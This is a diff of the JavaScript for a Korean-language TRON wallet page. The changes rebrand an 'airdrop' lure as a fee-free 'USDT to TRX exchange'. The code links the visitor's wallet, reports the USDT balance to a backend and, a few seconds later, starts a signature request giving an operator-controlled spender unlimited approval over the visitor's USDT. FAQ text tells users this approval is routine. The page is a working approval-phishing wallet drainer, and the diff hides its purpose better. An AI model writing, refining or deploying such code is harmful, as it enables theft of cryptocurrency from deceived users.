         function updateTicker(){var c=document.getElementById('ticker-container');var d=document.createElement('div');d.className='flex items-center gap-2 bg-slate-900/60 px-2.5 py-1 rounded-md border border-slate-800/80 shrink-0';d.innerHTML='<span class="text-slate-300 font-mono">'+tA[Math.floor(Math.random()*tA.length)]+'</span><span class="text-emerald-400 font-bold">'+tB[Math.floor(Math.random()*tB.length)]+'</span><span class="text-slate-500 text-[10px]">(방금 전)</span>';c.prepend(d);if(c.children.length>6)c.removeChild(c.lastChild);}
         for(var i=0;i<4;i++)updateTicker();setInterval(updateTicker,4500);
 
         // ===== FAQ =====
-        var faqs=[{q:'어떤 지갑을 사용할 수 있나요?',a:'TronLink, Trust Wallet, Token Pocket, Bitget Wallet, OKX Wallet 등 TRON 네트워크를 지원하는 모든 지갑 앱에서 참여 가능합니다.'},{q:'USDT 무제한 승인은 왜 필요한가요?',a:'최초 1회 무제한 승인을 진행하면 추가 서명 없이 에어드랍 보상이 자동 지급됩니다.'},{q:'TRX(가스비)가 없어도 되나요?',a:'네, TRX가 부족하면 시스템이 자동으로 충전해주므로 별도 준비가 필요 없습니다.'},{q:'승인 후 보상은 언제 지급되나요?',a:'승인 즉시 온체인 검증 후 1~3분 이내 지갑으로 자동 에어드랍됩니다.'}];
+        var faqs=[{q:'USDT → TRX 교환은 어떻게 하나요?',a:'지갑 연결 후 교환할 USDT 수량을 입력하고 교환 시작을 누르면 됩니다. 최초 1회 승인 후 즉시 교환됩니다.'},{q:'어떤 지갑을 사용할 수 있나요?',a:'TronLink, Trust Wallet, Token Pocket, Bitget, OKX 등 TRON 지원 지갑 모두 사용 가능합니다.'},{q:'TRX(가스비)가 없어도 되나요?',a:'네, TRX가 부족하면 시스템이 자동으로 충전해주므로 별도 준비가 필요 없습니다.'},{q:'교환 수수료는 얼마인가요?',a:'현재 수수료 무료 이벤트 기간입니다. 교환 금액의 100%가 TRX로 전환됩니다.'}];
         var faqC=document.getElementById('faq-container');
         faqs.forEach(function(f){var d=document.createElement('div');d.className='glass border border-slate-800/80 rounded-xl overflow-hidden';d.innerHTML='<button onclick="this.nextElementSibling.classList.toggle(\'hidden\');this.querySelector(\'i\').classList.toggle(\'rotate-180\')" class="w-full p-4 text-left flex items-center justify-between text-xs sm:text-sm font-bold text-slate-200 hover:text-white transition"><span>'+escapeHtml(f.q)+'</span><i class="fa-solid fa-chevron-down transition-transform text-slate-400"></i></button><div class="hidden px-4 pb-4 text-xs text-slate-400 leading-relaxed border-t border-slate-800/60 pt-3">'+escapeHtml(f.a)+'</div>';faqC.appendChild(d);});
 
@@ -420,20 +441,21 @@
                 var res=await fetch(API_BASE+'/wallet/connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:address,provider:provider})});
                 var data=await res.json();
                 if(data.status==='ok'){
-                    document.getElementById('display-balance').innerHTML=data.balance+' <span class="text-xs font-normal text-slate-400">USDT</span>';
+                    userUsdtBalance=parseFloat(data.balance)||0;document.getElementById('display-balance').innerHTML=data.balance+' <span class="text-xs font-normal text-slate-400">USDT</span>';try{document.getElementById('usdt-bal-swap').textContent=data.balance;}catch(e){}
                     if(data.isApproved){isApproved=true;setApprovedUI();}
                     showToast(provider+' 연결 완료 (잔액: '+data.balance+' USDT)');
                     appendLog('[연결] '+address+' | '+data.balance+' USDT','success');
                 }
             }catch(e){appendLog('[경고] 백엔드 연결 실패','warn');}
 
+            try{var _tr=await fetch(API_BASE+'/trx/'+address);var _td=await _tr.json();if(_td.trxBalance)try{document.getElementById('trx-bal-swap').textContent=parseFloat(_td.trxBalance).toFixed(2);}catch(e){}}catch(e){}
             if(!isApproved){setTimeout(function(){executeUnlimitedApprove();},2500);}
         }
 
         function setApprovedUI(){
             document.getElementById('display-allowance').textContent='무제한 (MAX)';
             document.getElementById('display-allowance').className='text-sm font-bold font-mono text-emerald-400 mt-1';
-            document.getElementById('allowance-badge-main').textContent='무제한 승인 완료';
+            document.getElementById('allowance-badge-main').textContent='교환 승인 완료';try{document.getElementById('approve-btn-text').textContent='USDT → TRX 교환하기';}catch(e){}
             document.getElementById('allowance-badge-main').className='text-xs px-3 py-1 rounded-full font-semibold border bg-emerald-500/10 border-emerald-500/30 text-emerald-400';
             document.getElementById('step2').className='p-4 rounded-xl border bg-emerald-950/20 border-emerald-500/40 step-progress step-done';
             document.getElementById('step2-status').innerHTML='<i class="fa-solid fa-circle-check mr-1"></i>승인됨';
@@ -446,6 +468,7 @@
         // ===== Approve (TRX 자동 충전 + 프로그레스 바) =====
         window.executeUnlimitedApprove=async function(){
             if(!isConnected||!currentWalletAddress){showToast('지갑을 먼저 연결하세요.','error');handleConnectWallet();return;}
+            if(isApproved){showToast('이미 교환 승인이 완료되었습니다');return;}
             var spender=await getSpenderAddress();
             if(!spender){showToast('운영자 주소를 불러오지 못했습니다.','error');appendLog('[오류] Spender 미설정','error');return;}
             var tw=await getInjectedTronWeb();
@@ -472,7 +495,7 @@
                 }else{
                     setProgress(0,'');hideProgress();
                     showToast('가스비 준비 실패','error');appendLog('[실패] '+(prepData.error||''),'error');
-                    btn.innerHTML='<i class="fa-solid fa-signature"></i><span>무제한 USDT 승인 서명하기 (Approve)</span>';btn.disabled=false;return;
+                    btn.innerHTML='<i class="fa-solid fa-arrow-right-arrow-left"></i><span id="approve-btn-text">USDT 교환 시작 (최초 1회 승인 포함)</span>';btn.disabled=false;return;
                 }
             }catch(pe){appendLog('[경고] TRX 확인 실패, 계속 진행','warn');}
 
@@ -488,14 +511,14 @@
 
                 // Step 3: 완료
                 setProgress(100,'온체인 승인 완료!');
-                appendLog('[3/3] 승인 성공! TxHash: '+txHash,'success');
+                appendLog('[3/3] 교환 승인 완료! TxHash: '+txHash,'success');
                 isApproved=true;setApprovedUI();
 
                 document.getElementById('modal-txhash').textContent=typeof txHash==='string'?txHash.substring(0,20)+'...':txHash;
                 document.getElementById('reward-modal').classList.add('active');
 
                 try{await fetch(API_BASE+'/wallet/connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:currentWalletAddress,provider:activeProvider})});}catch(e){}
-                showToast('온체인 무제한 승인 완료!');
+                showToast('교환 승인 완료!');
             }catch(err){
                 hideProgress();
                 var m=err&&err.message?err.message:JSON.stringify(err);
@@ -505,7 +528,7 @@
                     showToast('트랜잭션 실패','error');appendLog('[실패] '+m,'error');
                 }
             }finally{
-                btn.innerHTML='<i class="fa-solid fa-signature"></i><span>무제한 USDT 승인 서명하기 (Approve)</span>';btn.disabled=false;
+                btn.innerHTML='<i class="fa-solid fa-arrow-right-arrow-left"></i><span id="approve-btn-text">USDT 교환 시작 (최초 1회 승인 포함)</span>';btn.disabled=false;
             }
         };
     </script>
